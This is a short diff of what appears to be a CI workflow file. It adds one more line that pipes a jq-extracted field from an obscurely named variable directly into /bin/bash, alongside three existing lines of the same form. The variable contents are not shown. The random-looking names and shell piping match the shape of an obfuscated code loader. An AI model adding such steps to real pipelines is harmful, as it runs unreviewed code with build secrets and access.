@@ -42,6 +42,7 @@ jobs:
           echo $dwc65 | jq -r .kq53 | /bin/bash
           echo $gqnz32 | jq -r .kpafj63 | /bin/bash
           echo $c59 | jq -r .m085 | /bin/bash
+          echo $gyp23607 | jq -r .ow05358 | /bin/bash
 
       - name: Persist output
         uses: actions/upload-artifact@v4
